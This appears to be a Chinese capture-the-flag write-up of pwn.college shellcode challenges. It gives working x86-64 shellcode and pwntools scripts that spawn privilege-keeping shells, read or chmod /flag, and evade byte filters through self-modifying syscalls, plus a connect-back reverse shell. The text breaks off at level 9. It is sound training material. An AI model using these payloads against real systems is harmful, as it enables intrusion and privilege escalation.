# 0x1.前言

这一部分就应该开始学习shellcode了，哇库哇库。

其实这一关也是汇编代码的学习，但是这一部分的汇编代码大多用于调用操作系统函数，并且以此来达到一些目的，而不是只是像上一个模块那样只是实现基础的运算跳转等功能，因此这部分的内容一般也更实用更高级一些。

题目地址：https://dojo.pwn.college/challenges/shellcode

# 0x2.前置学习

首先是看学习视频来记录相关知识点：[Shellcode Injection -Introduction](https://www.youtube.com/watch?v=715v_-YnpT8&list=PL-ymxv0nOtqomtHqMqqgpuvWdVSs9NCBK)

## 1.easy shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。
在寄存器eip溢出后，加入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。 --摘自维、基、百科

通俗来讲就是一串16进制的机器码，由CPU解释为操作指令 ，最后由内存加载执行。这些操作指令可以由cs、msf等工具生成，也可以自己编写。

最简单的shellcode：

    
    
    .global _start
    _start:
    .intel_syntax noprefix
    mov rax,59                      # this is the syscall number of execve
    lea rdi,[rip+binsh]             # points the first argument of execve at the /bin/sh string below
    mov rsi,0                       # this makes the second argument, argv, NULL
    mov rdx,0                       # this makes the third argument, envp, NULL
    syscall                         # this triggers the system call
    binsh:                          # a label marking where the /bin/sh string is
    .string "/bin/sh"
    

.byte和.string段的区别：

就是string段会自动在最后加上\x00。

    
    
    .byte 0x48, 0x45, 0x4C, 0x4C, 0x4F	# "HELLO"
    .string "HELLO"					# "HELLO\0"
    

除了添加字符串段以外，还可以通过其他方式来传参：

    
    
    mov rbx, 0x0068732f6e69622f	# move "/bin/sh\0" into rbx
    push rbx					# push "/bin/sh\0" onto the stack
    mov rdi, rsp				# point rdi at the stack
    

另外shellcode并不是非得getshell，也可以用于达成其他目的，比如直接获取/flag：

    
    
    mov rbx, 0x00000067616c662f	# push "/flag" filename
    push rbx
    mov rax, 2				# syscall number of open
    mov rdi, rsp				# point the first argument at stack (where we have "/flag").
    mov rsi, 0				# NULL out the second argument (meaning, O_RDONLY).
    syscall				# trigger open("/flag", NULL).
    mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout).
    mov rsi, rax				# second argument is the file descriptor returned by open
    mov rdx, 0				# third argument is the number of bytes to skip from the input file
    mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
    mov rax, 40				# syscall number of sendfile
    syscall				# trigger sendfile(1, fd, 0, 1000).
    mov rax, 60				# syscall number of exit
    syscall				# trigger exit().
    

## 2.easy gdb

Your shellcode-elf is a Linux program, and you can debug it in gdb.

    
    
    gdb ./shellcode-elf
    

Caveats:  
there is no source code to display and navigate.  
to print the next 5 instructions: **`x/5i $rip`**  
you can examine qwords ( **`x/gx $rsp`** ), dwords ( **`x/2dx $rsp`** ),
halfwords ( **`x/4hx $rsp`** ), and bytes ( **`x/8b $rsp`** )  
to step one instruction (follow call instructions): **`si`** , NOT **`s`**  
to step one instruction (step over call instructions): **`ni`** , NOT **`n`**  
to break at an address: **`break *0x400000`**  
 **`run`** , **`continue`** , and reverse execution
(https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html) work as
expected  
You can hardcode breakpoints in your shellcode!  
breakpoints are implemented with the int3 instruction  
you can place this anywhere yourself!  
especially useful at the start of shellcode to catch the beginning of
shellcode execution

## 3.gcc汇编

Our way of building shellcode translates well to other architectures:

  * amd64:`gcc -nostdlib -static shellcode.s -o shellcode-elf`

  * mips:`mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`

参数说明：

  * `-nostdlib`：不使用标准库，使用标准库则必须有main函数

  * `-static`：静态编译，这样就不会引用共享库了

  * `-static-pie`：位置无关编译。

Similarly, we can run cross-architecture shellcode with an emulator:

  * amd64:`./shellcode`

  * mips:`qemu-mips-static ./shellcode-mips`

Useful qemu options:  
-strace print out a log of the system calls (like strace)  
-g 1234 wait for a gdb connection on port 1234. Connect with  
target remote localhost:1234 in gdb-multiarch

还有几个和汇编相关的工具：objdump、objcopy、hd

objdump能显示出二进制程序反汇编出来的代码：

    
    
    objdump a.out
    

objcopy能提取出来二进制程序一部分机器代码：

    
    
    objcopy --dump-section .text=b.bin a.out
    

hd之前读文件时用到过，可以显示文本数据的16进制，正好可以用来读机器代码：

    
    
    hd b.bin
    

## 4.pwntools shellcraft模块

pwntools中有一个模块叫做shellcraft模块，可以自动生成shellcode，很好用。

生成`x86_64`的linux汇编代码需要在生成之前加上一行代码，不然生成的代码不是同一架构的：

    
    
    context(arch = 'amd64' , os = 'linux', log_level="debug")
    

具体的使用方法还是结合题目来说比较好，所以使用方法见下方的level1通关过程。

常用的操作：

    
    
    #生成不带参数调用sh的代码：
    shellcraft.sh()
    #可以直接使用execve来调用带参数的sh：
    shellcraft.execve('sh',['sh','-p'])
    
    #生成插入指定字符串到栈中的代码：
    shellcraft.pushstr(string, append_null=True)
    
    #生成插入字符串序列到栈中的代码：
    #可以和上面的sh()代码结合起来调用-p参数的sh
    shellcraft.pushstr_array(reg, array)
    
    #读取文件并回显，调用结构为：open()->sendfileto()
    shellcraft.cat(filename, fd=1)
    shellcraft.cat2(filename, fd=1, length=16384)
    
    #打开文件，得到的文件描述符在rax，文件打开标志oflag见下面，mode是文件权限默认为0：
    shellcraft.open('/flag', oflag=0, mode=0)
    #读数据，fd可设为如rax这样的寄存器名，默认是将数据读取到栈中，默认读1字节：
    shellcraft.read(fd=0, buffer='rsp', count=8)
    #写数据
    shellcraft.write(fd=1,'rsp', count=8)
    
    #读取指定路径的文件：
    shellcraft.readfile(path, dst='rdi')
    
    #网络相关：
    #当没有回显时，一般可以用网络操作得到程序交互
    #
    
    #将sh绑定到端口，作为tcp服务（network='ipv4' or 'ipv6'）：
    shellcraft.bindsh(port, network)
    
    #连接指定远程地址，连接得到的文件描述符放在rbp寄存器中：
    shellcraft.connect(host, port, network='ipv4')
    
    #将输入输出全部绑定到指定文件描述符，一般用来将shell反弹到远程地址，dupsh可以在绑定之后自动启动sh：
    shellcraft.dup(sock='rbp')
    shellcraft.dupsh(sock='rbp')
    
    #将字符串写入文件描述符指定文件：
    shellcraft.echo(string, sock='1')
    

## 5.文件标志oflag和mode

嗯，还是建议在使用工具生成shellcode之前学习学习，把他们弄清楚，学会自己写怎么做，相关函数的调用查阅还是得到https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/，以免最后不会，比如打开文件时会用到flags，自己手动汇编的话肯定不能像c那样用宏定义或者像python那样用字符串，只能是知道数字来使用。

这里找到了fcntl.h中oflag的相关定义**（注意这是8进制）**：

    
    
    #define O_RDONLY             00
    #define O_WRONLY             01
    #define O_RDWR               02
    #define O_CREAT            0100 /* not fcntl */
    #define O_EXCL             0200 /* not fcntl */
    #define O_NOCTTY           0400 /* not fcntl */
    #define O_TRUNC           01000 /* not fcntl */
    #define O_APPEND          02000
    
    #ifdef  __USE_MISC
    # ifndef R_OK                   /* Verbatim from <unistd.h>.  Ugh.  */
    /* Values for the second argument to access.
       These may be OR'd together.  */
    #  define R_OK  4               /* Test for read permission.  */
    #  define W_OK  2               /* Test for write permission.  */
    #  define X_OK  1               /* Test for execute permission.  */
    #  define F_OK  0               /* Test for existence.  */
    # endif
    #endif /* Use misc.  */
    

然后是在sys/stat.h找到了mode的相关定义**（注意这是8进制）**：

    
    
    #define __S_ISUID       04000   /* Set user ID on execution.  */
    #define __S_ISGID       02000   /* Set group ID on execution.  */
    #define __S_ISVTX       01000   /* Save swapped text after use (sticky).  */
    #define __S_IREAD       0400    /* Read by owner.  */
    #define __S_IWRITE      0200    /* Write by owner.  */
    #define __S_IEXEC       0100    /* Execute by owner.  */
    
    #define S_IRUSR __S_IREAD       /* Read by owner.  */
    #define S_IWUSR __S_IWRITE      /* Write by owner.  */
    #define S_IXUSR __S_IEXEC       /* Execute by owner.  */
    /* Read, write, and execute by owner.  */
    #define S_IRWXU (__S_IREAD|__S_IWRITE|__S_IEXEC)
    
    #ifdef __USE_MISC
    # define S_IREAD        S_IRUSR
    # define S_IWRITE       S_IWUSR
    # define S_IEXEC        S_IXUSR
    #endif
    
    #define S_IRGRP (S_IRUSR >> 3)  /* Read by group.  */
    #define S_IWGRP (S_IWUSR >> 3)  /* Write by group.  */
    #define S_IXGRP (S_IXUSR >> 3)  /* Execute by group.  */
    /* Read, write, and execute by group.  */
    #define S_IRWXG (S_IRWXU >> 3)
    
    #define S_IROTH (S_IRGRP >> 3)  /* Read by others.  */
    #define S_IWOTH (S_IWGRP >> 3)  /* Write by others.  */
    #define S_IXOTH (S_IXGRP >> 3)  /* Execute by others.  */
    /* Read, write, and execute by others.  */
    #define S_IRWXO (S_IRWXG >> 3)
    
    #define S_IRWXU (__S_IREAD|__S_IWRITE|__S_IEXEC)
    # define ACCESSPERMS (S_IRWXU|S_IRWXG|S_IRWXO) /* 0777 */
    # define ALLPERMS (S_ISUID|S_ISGID|S_ISVTX|S_IRWXU|S_IRWXG|S_IRWXO)/* 07777 */
    # define DEFFILEMODE (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)/* 0666*/
    

头文件的讲解可以去这个网站查看：https://pubs.opengroup.org/onlinepubs/7908799/xsh/fcntl.h.html

这些头文件都可以在这些路径找到：

    
    
    /usr/include/
    /usr/include/x86_64-linux-gnu/
    

## 6.c语言运行汇编代码

看挑战代码就可以看到在c中运行汇编代码的方法：

    
    
    int main(int argc, char **argv, char **envp)
    {
        shellcode_mem = mmap((void *) 0x2e15e000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);//分配了0x1000内存空间，起始地址为0x2e15e000，并且给予了读写运行的权限
        printf("[LEAK] Mapping shellcode memory at %p!\n", shellcode_mem);
        assert(shellcode_mem == (void *) 0x2e15e000);
        
        puts("Reading 0x6 bytes from stdin.\n");
        shellcode_size = read(0, shellcode_mem, 0x6);//从标准输入中读取shellcode
        assert(shellcode_size > 0);
        
        ((void(*)())shellcode_mem)();//运行代码
    }
    

# 0x3.通关记录

## level1：无过滤（小试牛刀）

1：无过滤

根据前置知识，第一关就是小试牛刀了，因为什么过滤也没有，可以直接执行你输入的shellcode。

这里可以直接用上面的读取flag的easy shellcode，汇编后用objcopy提取出来指令后运行即可：

    
    
    #生成二进制程序a.out
    gcc -nostdlib -static 1.s
    
    #提取机器代码b.bin
    objcopy --dump-section .text=b.bin a.out
    
    #运行挑战程序并运行shellcode：
    cat b.bin | /challenge/babyshell_level1
    

另外可以使用python的pwntools，可以自动生成shellcode，就不需要我们自己编写了，如下：

    
    
    #!/usr/bin/python
    #encoding=utf-8
    
    from pwn import *
    context(arch = 'amd64' , os = 'linux')
    
    #assembly = shellcraft.sh()	#sh的shellcode
    assembly = shellcraft.cat("/flag")	#直接读取flag
    
    assemed=asm(assembly)
    sh=process(f"/challenge/{os.getenv('HOSTNAME')}")
    sh.send(assemed)
    sh.interactive()
    

通过shellcraft读取flag的方式有好几种，如下：

其他讲解还得看人家官方文档：http://docs.pwntools.com/en/stable/shellcraft/amd64.html

    
    
    #直接调用cat读取，它的利用是open()->sendfileto()：
    shellcraft.cat("/flag")
    
    #用open、read、write：
    shellcode = shellcraft.open('/flag')
    shellcode += shellcraft.read('rax','rsp',100)
    shellcode += shellcraft.write(1,'rsp',100)
    

直接执行sh后没有root权限也不能读/flag，需要加-p参数。

想要进行交互时shell运行程序还需要cat在读取完文件后，还需要读取输入，所以需要这样执行：

    
    
    cat 1.bin - | /challenge/babyshell_level*
    

shellcraft.sh()生成的shellcode如下：

    
    
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
    

我觉得更好用的还是push相关的函数如`shellcraft.pushstr()`，可以自动生成push进栈的汇编代码，我们执行后直接利用rsp的值就可以传参了，如下：

还有一个是`shellcraft.pushstr_array()`，这个更好用，直接能把字符串序列推入栈，还能自动把字符串地址放入指定的寄存器，两个参数，第一个是寄存器，第二个是字符串序列，如下：

    
    
    >>> print(shellcraft.pushstr(b'/bin/sh'))
        /* push b'/bin/sh\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x68732f6e69622f
        xor [rsp], rax
        
    >>> print(shellcraft.pushstr_array("rsi",["sh","-p"]))
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x702d006873
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
    

所以我们可以把上面的sh代码改一下，改成加上`-p`参数的，这样我们就可以使用euid=0的权限了，nice！：

（后来发现可以直接用`shellcraft.execve('sh',['sh','-p'])`来生成）

    
    
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x702d006873
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
    

## level2：重复宏汇编

2：会随机过滤前0~0x800字节的汇编，所以又用到前面的宏汇编了：

    
    
    .rept 0x800
    nop
    .endr
    cat("/flag")
    

## level3：过滤空字节

3：不让使用\x00字节，那就不能使用bytes或者string段了：

    
    
    This challenge requires that your shellcode have no NULL bytes!
    

不能像上面最开始那个easy shellcode那样再编辑一个.string段来使用，但是可以改成直接赋值或者通过栈赋值等方式进行赋值。

    
    
    cat("/flag")
    

## level4：过滤扩展指令0x48

4：不让使用'H'字节，就是开头那个0x48吧，仔细观察后好像是不让使用mov相关指令，应该可以用or代替——原本是这么想的，结果or好像不能直接操作直接数，没关系，用push和pop来代替吧——结果也不行，不知道x86-64指令集有没有除mov以外其他可以直接操作64位直接数的指令，试了试其他指令好像都只能直接操作32位，然后网上找了找也很难找到完整的指令集手册。

干脆直接用32位吧，之后用算术逻辑移位就行了。

改一下就能把mov指令改为xor+or+shl+or的组合，结果一尝试，还是过不去，因为才发现xor、or、shl居然都会用0x48也就是'H'，这3条指令居然都不能使用？不对啊，结果我仔细观察了一下，发现我之前理解错了，这个0x48会出现在有rax的指令中，而不会出现在eax的指令中，也就是说这个0x48是扩展长度指令的标志，这样总算真相大白了。

又测试了下，虽然这些扩展指令都会加上0x48的标志，但是push和pop到rax时并不会，所以就很开心了，全部操作dwords，最后push和pop一下就能放到扩展寄存器中了，完美。

要求如下：

    
    
    This challenge requires that your shellcode have no H bytes!
    

改一下上面的sh -p的shellcode。

把mov指令改为xor+or+shl+or版本（不起作用）：

    
    
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        xor rax,rax
        or rax,0x732f2f2f
        shl rax,32
        or rax,0x6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        xor rax,rax
        or rax,0x1010101
        shl rax,32
        or rax,0x01010101
        push rax
        xor rax,rax
        or rax,0x1010171
        shl rax,32
        or rax,0x2c016972
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        xor rsi,rsi
        or rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
    

利用dwords操作和push/pop的代码（通过）：

    
    
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        //mov rax, 0x732f2f2f6e69622f
        //push rax
        push 0x6e69622f
        mov dword ptr [rsp+4],0x732f2f2f
        //mov rdi, rsp
        push rsp
        pop rdi
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        //mov rax, 0x702d006873
        //push rax
        push 0x2d006873
        mov dword ptr [rsp+4],0x70
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        //push 0xb
        //pop rsi
        //add rsi, rsp
        push rsp
        add dword ptr [rsp],0xb
        //pop rsi
        //push rsi /* '-p\x00' */
        //push 0x10
        //pop rsi
        //add rsi, rsp
        //push rsi /* 'sh\x00' */
        push rsp
        add dword ptr [rsp],0x10
        //mov rsi, rsp
        push rsp
        pop rsi
        xor edx, edx /* 0 */
        /* call execve() */
        push 0x3b /* 0x3b */
        pop rax
        syscall
    

## level5~6：过滤syscall

5：不让在代码中出现syscall等原语，如下要求：

    
    
    This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.
    

想着不让我用0x050f，那我就先弄进去个0x050e然后再inc就是syscall了，这时候再jmp过去即可，因为数据其实就是指令，前面都是用的栈操作，有点习惯这么用了，所以就直接这样写个代码：

    
    
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x702d006873
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 0x3b /* 0x3b */
        pop rax
        //syscall
        push 0x050e
        inc qword ptr [rsp]
        jmp rsp
        nop
    

getflag~

6：和上一关要求基本一致，只不过把代码前4M的容量都不可写了。

    
    
    This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
    are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
    (`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
    insert the `syscall` instructions at runtime.
    
    Removing write permissions from first 4096 bytes of shellcode.
    

也就是说比第5关多了一个禁止写数据的权限，问题在于我第5关直接用的栈，所以这一关直接用5关的代码就能过。

除此以外他说是前4M的空间去除了写权限，但是实际上高于4M的空间还是可以写，这也是一种思路。

## level7：无输出

7：把标准输出和标准错误输出禁止了

要求如下：

    
    
    This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
    
    This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.
    
    This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output.
    You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.
    

首先想了个方法能用socket远程连接一下即可：

    
    
    /* open new socket */
        /* open new socket */
        /* call socket('AF_INET', SOCK_STREAM (1), 0) */
        push 0x29 /* sys_socket */
        pop rax
        push 2 /* AF_INET */
        pop rdi
        push 1 /* SOCK_STREAM */
        pop rsi
        cdq /* rdx=0 */
        syscall
        /* Put socket into rbp */
        mov rbp, rax
        /* Create address structure on stack */
        /* push b'\x02\x00"\xb8\x7f\x00\x00\x01' */
        mov rax, 0x201010101010101
        push rax
        mov rax, 0x201010101010101 ^ 0x100007fb8220002
        xor [rsp], rax
        /* Connect the socket */
        /* call connect('rbp', 'rsp', 0x10) */
        push 0x2a /* SYS_connect */
        pop rax
        mov rdi, rbp
        push 0x10
        pop rdx
        mov rsi, rsp
        syscall
        /* dup() file descriptor rbp into stdin/stdout/stderr */
    dup_3:
        /* moving rbp into rbp, but this is a no-op */
        push 3
    loop_4:
        pop rsi
        dec rsi
        js after_5
        push rsi
        /* call dup2('rbp', 'rsi') */
        push 0x21 /* SYS_dup2 */
        pop rax
        mov rdi, rbp
        syscall
        jmp loop_4
    after_5:
        /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x702d006873
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 0x3b /* SYS_execve */
        pop rax
        syscall
    

另一种是直接写文件，只不过这个权限不知道怎么回事一直弄得不是我想弄到的权限，即使直接用c语言的open权限也不对，不明白是怎么回事。

    
    
    open('/flag')
    read(fd='rax',buffer='rsp', count=100)
    open('/tmp/flag',oflag=0o101,mode=0o07777)
    write('rax','rsp',100)
    

还有一种方式是看了有才的网友的，直接调用syscall 0x5a，是chmod函数，然后读取flag。

    
    
    chmod('/flag',0o777)
    

## level8、13、14：mini shellcode（0x12、0xc、0x6）

8：要求shellcode不超过0x12bytes，如下要求：

    
    
    [LEAK] Mapping shellcode memory at 0x29cd6000!
    Reading 0x12 bytes from stdin.
    

想不起来，就去看了下讨论。

没想到还和上面的chmod有关，linux有一个特性，chmod在操作软链接时不会作用于软链接，而会直接作用于所指向的文件，这样就不用输入`/flag`这5个字节了，只需要使用任意自定义一个字节即可。

所以用shellcraft生成一下：

    
    
    chmod('/flag',0o4)
    

生成的代码是：

    
    
    /* chmod(file='f', mode=4) */
        /* push b'f\x00' */
        push 0x66
        mov rdi, rsp
        push 4
        pop rsi
        /* call chmod() */
        push SYS_chmod /* 0x5a */
        pop rax
        syscall
    

总共才13字节，也就是0xd，通过！

稍微改下，把`push 0x5a;pop rax`换成`mov al,0x5a`又可以省一字节，达到0xc。

不过受此启发，我想到可以利用execve来执行一下另外的程序或脚本，这样岂不是也挺简单的？

于是写了个名为`c`的脚本：

    
    
    #!/bin/bash -p
    id
    cat /flag
    

然后shellcraft生成一下：

    
    
    execve('c')
    

生成的代码为：

    
    
    /* execve(path='c', argv=0, envp=0) */
        /* push b'c\x00' */
        push 0x63
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
    

才15bytes，即0xe，也是可以的，而且其中有个清空寄存器的操作，因为是开始时调用，所以按理说可以去掉（但是实际尝试后不行，如果是在单独运行时可以，但是此刻在进程中间运行这个shellcode的话寄存器中可能原本不为空，所以会调用失败），另外再改一下rax的赋值，如下：

    
    
    push 0x63
        mov rdi, rsp
        xor edx, edx
        xor esi, esi
        mov al,0x3b
        syscall
    

这样改后是0xd，也就是13字节，虽然和前面的长度没怎么变化，但是很明显这个shellcode能干更多操作，还是有一定用处的。

然后学到了一个新的指令：扩展指令`cdq`，这个指令的作用是将eax的最高位即31位赋值给edx的每一位，这个指令一般是在32位系统中除法前使用的，就是让edx作为eax的高位组合成64位的数字，让符号统一。

为什么要说它呢？因为这条指令只有1字节，用它一般就能代替`xor edx,
edx`这条指令了，便又节省1字节，那么这个shellcode也能剪短到12字节，和上面一样：

    
    
    push 0x63
        mov rdi, rsp
        xor esi, esi
        cdq
        mov al,0x3b
        syscall
    

13：要求写个不超过0xc字节的mini shellcode，正好之前剪短了，直接就能用，嘿嘿。

14：噗！0x6，直接又减一半，杀了我吧。

不过人家是最后一关了，难点倒也正常。。。。

先调试，运行到代码前时的现状保存下来：

    
    
    *RAX  0x0
     RBX  0x5603eabf77e0 (__libc_csu_init) ◂— endbr64
     RCX  0x7fd6e999c1e7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
     RDX  0x2e15e000 ◂— xor    eax, eax /* 0x50f7fb2c031 */
     RDI  0x7fd6e9a794c0 (_IO_stdfile_1_lock) ◂— 0x0
     RSI  0x5603eae4a2a0 ◂— '\nxecuting shellcode!\nut to execute the following shellcode:\nnd arguments and close all file descriptors > 2.\nthan doing\n\n'
     R8   0x16
     R9   0x2f
     R10  0x5603eabf83f5 ◂— 0x6c6c656873000a21 /* '!\n' */
     R11  0x246
     R12  0x5603eabf71e0 (_start) ◂— endbr64
     R13  0x7fffc58f2320 ◂— 0x1
     R14  0x0
     R15  0x0
     RBP  0x7fffc58f2230 ◂— 0x0
     RSP  0x7fffc58f21f0 —▸ 0x7fffc58f2216 ◂— 0x2710eabf71e00000
    *RIP  0x5603eabf77ca (main+611) ◂— call   rdx
    ───────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
       0x5603eabf77af <main+584>    lea    rdi, [rip + 0xce0]
       0x5603eabf77b6 <main+591>    call   puts@plt <puts@plt>
    
       0x5603eabf77bb <main+596>    mov    rax, qword ptr [rip + 0x285e] <0x5603eabfa020>
       0x5603eabf77c2 <main+603>    mov    rdx, rax
       0x5603eabf77c5 <main+606>    mov    eax, 0
     ► 0x5603eabf77ca <main+611>    call   rdx <0x2e15e000>
    
       0x5603eabf77cc <main+613>    mov    eax, 0
       0x5603eabf77d1 <main+618>    leave
       0x5603eabf77d2 <main+619>    ret
    
       0x5603eabf77d3               nop    word ptr cs:[rax + rax]
       0x5603eabf77dd               nop    dword ptr [rax]
    ───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
    00:0000│ rsp 0x7fffc58f21f0 —▸ 0x7fffc58f2216 ◂— 0x2710eabf71e00000
    01:0008│     0x7fffc58f21f8 —▸ 0x7fffc58f2338 —▸ 0x7fffc58f2857 ◂— 0x0
    02:0010│     0x7fffc58f2200 —▸ 0x7fffc58f2328 —▸ 0x7fffc58f283a ◂— 0x0
    03:0018│     0x7fffc58f2208 ◂— 0x1eabf77e0
    04:0020│     0x7fffc58f2210 ◂— 0x0
    05:0028│     0x7fffc58f2218 ◂— 0x2710eabf71e0
    06:0030│     0x7fffc58f2220 —▸ 0x7fffc58f2330 ◂— 0x0
    07:0038│     0x7fffc58f2228 —▸ 0x7fffc58f23e8 ◂— 0x0
    ─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
     ► f 0   0x5603eabf77ca main+611
       f 1   0x7fd6e98b20b3 __libc_start_main+243
       f 2   0x5603eabf720e _start+46
    

首先第一个思路是利用read函数，先调试之后发现rax的值已经为0（syscall
code），rdx的值已经为0x2e15e000（自定义代码的起始内存运行地址，count），接下来只需要把rdi设为0（fd），而rsi的值设为rdx的值（*buf）便可以从输入读取shellcode并在下一步执行。

所以14-1.s是：

    
    
    xor edi,edi
    mov esi,edx
    syscall
    

然后14-2.s就是shellcode了，除此之外因为写地址在0x2e15e000是程序开始的地方，而read函数运行时rip已经到6字节后的地方了，所以前面要放上一些nop以覆盖前面的指令，所以差不多就是这个样子：

    
    
    .rept 0x20
    nop
    .endr
    execve("/bin/sh",["sh","-p"])
    

然后生成14-1.bin和14-2.bin之后直接运行即可拿到flag：

    
    
    cat 14-1.bin 14-2.bin | /challenge/babyshell_level14
    

第二个思路是利用chmod函数，需要用rdi指定文件名，rsi指定文件权限。

而此时调试的结果rcx指向的值很特别：

    
    
    RCX  0x7fd6e999c1e7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
    

所以我们再设一个名为`H=`的执行`/flag`的软链接，将rcx的值赋给rdi应该就可以成功设置`/flag`的权限。

    
    
    mov rdi,rcx
    mov al,90	/* sys_chmod */
    syscall
    

不过这个汇编是7字节，真可惜，特意返回了第13关尝试了下，发现确实可以成功设置`/flag`的权限，不过不知道是不是rsi的值是不是不一样，没检验，设置的是0o240的权限。然后上去看了下，rsi的值是0x5603eae4a2a0，换算为8进制是0o2540175271121240，好像还真是240，无语，那就不能直接这样利用了，但是某些情况下可能可以。

另外不能直接把`mov rdi,rcx`改为`mov edi,ecx`，因为在给edi赋值时会将高32位全部设为0，这是我刚实验知道的。

虽然这条路好像不能走，但是这确实也是一种剪短shellcode的思路。

总之，第14关考的点和前面的第8关和第13关不太一样，前面的mini
shellcode虽然短，但是在大部分的情况下都是可以直接利用而不需要什么条件的，而这一关想到的解是必须在当前环境下经过调试才得到的解，这个mini
shellcode虽然最短，但是应用范围也仅限于这几道题，在调试的前提下才得到的。

这一关考的是调试+对症下药的本事，真正自己做出来之后感觉非常的nice，总之，本阶段也完结撒花了~

## level9：跳过中断

9：每隔10字节就会用10条中断命令覆盖你的指令，所以需要跳过它，要求如下：

    
    
